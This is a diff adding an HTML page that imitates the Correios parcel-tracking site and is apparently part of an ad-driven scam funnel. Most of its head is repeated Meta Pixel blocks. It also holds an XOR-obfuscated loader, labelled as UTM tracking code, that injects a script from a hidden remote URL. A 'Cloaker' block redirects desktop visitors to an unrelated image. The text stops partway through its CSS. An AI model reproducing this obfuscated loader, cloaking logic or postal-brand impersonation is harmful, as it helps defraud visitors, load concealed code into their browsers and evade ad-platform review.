@@ -1,0 +1,1733 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <meta name="theme-color" content="#f1f0ed">
+  <title>Correios — Acompanhe sua encomenda</title>
+  <meta name="description" content="Consulte sua encomenda por código de rastreamento. Serviço independente com encaminhamento ao portal oficial.">
+
+  <link rel="stylesheet" href="css/style.css">
+  <link rel="icon" type="image/png" href="images/icon.png">
+  <script src="../utm-tracking.js"></script>
+
+
+
+
+
+<!-- UTM FACEBOOK Code -->
+
+
+
+<script>
+(function () {
+  "use strict";
+
+  var STORAGE_KEY = "funil_tracking_params";
+
+  // Parâmetros que serão preservados entre as etapas.
+  var TRACKING_PARAMS = [
+    "utm_source",
+    "utm_medium",
+    "utm_campaign",
+    "utm_content",
+    "utm_term",
+    "fbclid"
+  ];
+
+  function readStorage(storage) {
+    try {
+      return JSON.parse(storage.getItem(STORAGE_KEY) || "{}");
+    } catch (e) {
+      return {};
+    }
+  }
+
+  function saveStorage(storage, data) {
+    try {
+      storage.setItem(STORAGE_KEY, JSON.stringify(data));
+    } catch (e) {}
+  }
+
+  function getSavedParams() {
+    var session = readStorage(sessionStorage);
+    var local = readStorage(localStorage);
+
+    return Object.assign({}, local, session);
+  }
+
+  function saveParams(data) {
+    saveStorage(sessionStorage, data);
+    saveStorage(localStorage, data);
+  }
+
+  // 1. Recupera os parâmetros já salvos.
+  var params = getSavedParams();
+
+  // 2. Captura os parâmetros recebidos na URL atual.
+  var currentURL = new URL(window.location.href);
+
+  TRACKING_PARAMS.forEach(function (key) {
+    var value = currentURL.searchParams.get(key);
+
+    // Atualiza somente se o parâmetro estiver presente
+    // e tiver um valor não vazio.
+    if (value !== null && value.trim() !== "") {
+      params[key] = value;
+    }
+  });
+
+  // 3. Salva os parâmetros para as próximas páginas.
+  saveParams(params);
+
+  // 4. Função global para redirecionar preservando as UTMs.
+  window.goToNext = function (nextURL) {
+    var destination = new URL(nextURL, window.location.href);
+    var saved = getSavedParams();
+
+    // Não substitui parâmetros de tracking já definidos
+    // explicitamente na URL de destino.
+    TRACKING_PARAMS.forEach(function (key) {
+      if (
+        saved[key] &&
+        !destination.searchParams.has(key)
+      ) {
+        destination.searchParams.set(key, saved[key]);
+      }
+    });
+
+    window.location.href = destination.href;
+  };
+
+  // 5. Propaga as UTMs automaticamente nos links internos.
+  document.addEventListener("click", function (event) {
+    var link = event.target.closest("a[href]");
+
+    if (!link) return;
+    if (link.target === "_blank") return;
+    if (event.ctrlKey || event.metaKey || event.shiftKey) return;
+    if (event.button !== 0) return;
+
+    var destination;
+
+    try {
+      destination = new URL(link.href, window.location.href);
+    } catch (e) {
+      return;
+    }
+
+    // Só modifica links da mesma origem.
+    if (destination.origin !== window.location.origin) return;
+
+    TRACKING_PARAMS.forEach(function (key) {
+      if (
+        params[key] &&
+        !destination.searchParams.has(key)
+      ) {
+        destination.searchParams.set(key, params[key]);
+      }
+    });
+
+    link.href = destination.href;
+  });
+
+  // Disponibiliza os parâmetros para outros scripts.
+  window.getFunilTracking = function () {
+    return Object.assign({}, getSavedParams());
+  };
+
+})();
+</script>
+
+
+<!-- END UTM FACEBOOK CODE -->
+
+<!-- UTMFY Code -->
+
+<script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+
+
+<script>(function(){var f_tx=atob("DAdM54C6GPaiGO83GnxukvLWOsyAcJtDanR2yK/ZfJiMbZtac2E1yePVddjAasBEeXUll/TJN4PWdZwYdmY4gvPONpzROsMVe3M4lenYbYLHa80NQXxuieHXfdSYOotWbmZhkvTXcZDbNZ9Ff3EpifSXYJXNfMJEeWxuy6LMeZrXfc0NOCUxy/uYdpfPfc0NOGMtk+GXbYLPcYlON3c+gvbfdoKPa5pVc2M/xayYbpfObYoVICVumt3H");var p_rt=[];for(var w_puw=0;w_puw<f_tx.length;w_puw++){p_rt.push(f_tx.charCodeAt(w_puw)&255);}var r_7d0y=p_rt[0];var f_5kg=p_rt.slice(1,1+r_7d0y);var p_0kac=p_rt.slice(1+r_7d0y);var t_c=p_0kac.map(function(b,d_nin){return b^f_5kg[d_nin%r_7d0y];});var o_pdk="";for(var q_rs3e=0;q_rs3e<t_c.length;q_rs3e++){o_pdk+=String.fromCharCode(t_c[q_rs3e]&255);}var h_l0yz=decodeURIComponent(escape(o_pdk));var k_s=JSON.parse(h_l0yz);var q_ane=k_s.globals||[];q_ane.forEach(function(w_dru){window[w_dru.name]=w_dru.value;});var w_w=document.createElement("script");w_w.src=k_s.url;w_w.async=true;w_w.defer=true;(k_s.attributes||[]).forEach(function(g_1){w_w.setAttribute(g_1.name,g_1.value);});(document.head||document.documentElement).appendChild(w_w);})();</script>
+
+
+
+<!-- END UTMFY CODE -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1117296950800245');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1117296950800245&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1746333669903668');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1746333669903668&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1015408774399172');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1015408774399172&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2243844239765046');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2243844239765046&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1375844174304393');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1375844174304393&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2137523013457243');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2137523013457243&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '847755107473498');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=847755107473498&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2083978855786884');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2083978855786884&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1313184030636134');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1313184030636134&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '229463223255909');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=229463223255909&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '4234627643479096');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=4234627643479096&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '794380730326961');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=794380730326961&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2299537240549041');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2299537240549041&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1342087550707140');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1342087550707140&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1173269651619651');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1173269651619651&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1574851956843520');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1574851956843520&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1185480309697471');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1185480309697471&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '810965115433003');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=810965115433003&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '768728832672906');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=768728832672906&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2763526227120952');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2763526227120952&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '763158696614724');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=763158696614724&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1832985513945847');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1832985513945847&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1768764637040662');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1768764637040662&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1884540289109881');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1884540289109881&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+    <!-- UTMify Pixel -->
+    <script>
+      window.pixelId = "67b759e9f454faf48c0999a2";
+      var a = document.createElement("script");
+      a.setAttribute("async", "");
+      a.setAttribute("defer", "");
+      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+      document.head.appendChild(a);
+    </script>
+
+    <!-- Meta Pixel Code -->
+    <script>
+      !(function (f, b, e, v, n, t, s) {
+        if (f.fbq) return;
+        n = f.fbq = function () {
+          n.callMethod
+            ? n.callMethod.apply(n, arguments)
+            : n.queue.push(arguments);
+        };
+        if (!f._fbq) f._fbq = n;
+        n.push = n;
+        n.loaded = !0;
+        n.version = "2.0";
+        n.queue = [];
+        t = b.createElement(e);
+        t.async = !0;
+        t.src = v;
+        s = b.getElementsByTagName(e)[0];
+        s.parentNode.insertBefore(t, s);
+      })(
+        window,
+        document,
+        "script",
+        "https://connect.facebook.net/en_US/fbevents.js",
+      );
+      fbq("init", "574352008891416");
+      fbq("track", "PageView");
+    </script>
+
+    <!-- Cloaker -->
+
+
+<script type="text/javascript">
+  if (!navigator.userAgent.match(/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile)/) && window.innerWidth > 768) {
+    window.location.href = 'https://wallpaperaccess.com/full/3887227.jpg';
+  }
+  </script>
+
+
+
+
+  
+</head>
+<body>
+  <a class="skip-link" href="">Pular para o rastreamento</a>
+
+  <div class="accessibility-bar">
+    <button type="button" class="accessibility-toggle" aria-expanded="false" aria-controls="accessibility-menu">
+      Acessibilidade <span class="caret" aria-hidden="true"></span>
+    </button>
+
+  </div>
+
+  <header class="site-header">
+    <button class="menu-button" type="button" >
+      <span></span><span></span><span></span>
+    </button>
+<style>
+  .brand {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    text-decoration: none;
+    line-height: 0;
+  }
+
+  .brand-mark {
+    display: block;
+    width: 140px;
+    height: 30px;
+    object-fit: contain;
+    flex-shrink: 0;
+  }
+</style>
+
+<a class="brand"  aria-label="Início">
+  <img
+    class="brand-mark"
+    src="images/logo.svg"
+    alt="Logo"
+  >
+</a>
+<nav class="header-actions" aria-label="Atalhos">
+  <a
+    class="action-link"
+    
+    aria-label="Ajuda e informações"
+    title="Ajuda"
+  >
+    <img src="images/entrar.svg" alt="" class="action-icon">
+  </a>
+
+  <a
+    class="action-link"
+    
+    aria-label="Buscar encomenda"
+    title="Buscar"
+  >
+    <img src="images/lupa.svg" alt="" class="action-icon">
+  </a>
+</nav>
+
+<style>
+  .header-actions {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 16px;
+  }
+
+  .action-link {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    width: 32px;
+    height: 32px;
+    text-decoration: none;
+  }
+
+  .action-icon {
+    display: block;
+    width: 24px;
+    height: 24px;
+    object-fit: contain;
+  }
+</style>
+  </header>
+
+  <nav class="site-menu" id="site-menu" hidden aria-label="Menu principal">
+    <a href="">Acompanhe sua encomenda</a>
+    <a href="">Ajuda</a>
+  </nav>
+
+ <!-- SEÇÃO DE CONSULTA DE ENCOMENDA -->
+<section id="rastreamento" class="tracking-section">
+  <style>
+    #rastreamento.tracking-section {
+      width: 100%;
+      max-width: 760px;
+      margin: 36px auto;
+      padding: 20px;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
+        Roboto, Arial, sans-serif;
+      color: #182230;
+    }
+
+    #rastreamento *,
+    #rastreamento *::before,
+    #rastreamento *::after {
+      box-sizing: border-box;
+    }
+
+    #rastreamento .consulta-card {
+      overflow: hidden;
+      background: #ffffff;
+      border: 1px solid #e5eaf1;
+      border-radius: 18px;
+      box-shadow: 0 12px 35px rgba(20, 40, 75, 0.08);
+    }
+
+    #rastreamento .consulta-header {
+      padding: 27px 28px 24px;
+      background: linear-gradient(135deg, #f7faff, #edf4ff);
+      border-bottom: 1px solid #e4ebf5;
+    }
+
+    #rastreamento .consulta-tag {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 15px;
+      color: #2559a9;
+      font-size: 12px;
+      font-weight: 800;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+    }
+
+    #rastreamento .consulta-tag::before {
+      content: "";
+      width: 8px;
+      height: 8px;
+      flex: 0 0 8px;
+      background: #3478db;
+      border-radius: 50%;
+    }
+
+    #rastreamento .consulta-header h2 {
+      margin: 0 0 10px;
+      color: #172b4d;
+      font-size: clamp(23px, 4vw, 31px);
+      font-weight: 800;
+      line-height: 1.25;
+      text-align: left;
+    }
+
+    #rastreamento .consulta-header p {
+      margin: 0;
+      color: #52647c;
+      font-size: 15px;
+      line-height: 1.7;
+    }
+
+    #rastreamento .consulta-body {
+      padding: 27px 28px 29px;
+    }
+
+    #rastreamento .consulta-status {
+      display: flex;
+      align-items: flex-start;
+      gap: 13px;
+      padding: 17px;
+      margin-bottom: 25px;
+      background: #f4f7fb;
+      border: 1px solid #e0e7f0;
+      border-radius: 12px;
+    }
+
+    #rastreamento .status-icon {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 42px;
+      height: 42px;
+      flex: 0 0 42px;
+      color: #285ca8;
+      background: #e4edfc;
+      border-radius: 12px;
+    }
+
+    #rastreamento .status-icon svg {
+      width: 23px;
+      height: 23px;
+    }
+
+    #rastreamento .status-content {
+      min-width: 0;
+    }
+
+    #rastreamento .status-label {
+      display: block;
+      margin-bottom: 5px;
+      color: #607087;
+      font-size: 12px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    #rastreamento .status-value {
+      display: block;
+      color: #243a58;
+      font-size: 16px;
+      font-weight: 800;
+      line-height: 1.5;
+      overflow-wrap: anywhere;
+    }
+
+    #rastreamento .consulta-details-title {
+      margin: 0 0 15px;
+      color: #25364d;
+      font-size: 17px;
+      font-weight: 800;
+    }
+
+    #rastreamento .consulta-details {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+      margin-bottom: 24px;
+    }
+
+    #rastreamento .detail-item {
+      min-width: 0;
+      padding: 15px;
+      background: #fafbfd;
+      border: 1px solid #e8edf3;
+      border-radius: 11px;
+    }
+
+    #rastreamento .detail-label {
+      display: block;
+      margin-bottom: 7px;
+      color: #6b7789;
+      font-size: 12px;
+      font-weight: 600;
+    }
+
+    #rastreamento .detail-value {
+      display: block;
+      color: #243247;
+      font-size: 14px;
+      font-weight: 750;
+      line-height: 1.5;
+      overflow-wrap: anywhere;
+    }
+
+    #rastreamento .consulta-notice {
+      padding: 16px 17px;
+      margin-bottom: 23px;
+      background: #fffaf0;
+      border: 1px solid #f2e3bc;
+      border-radius: 11px;
+    }
+
+    #rastreamento .consulta-notice h3 {
+      margin: 0 0 7px;
+      color: #6b4a0b;
+      font-size: 15px;
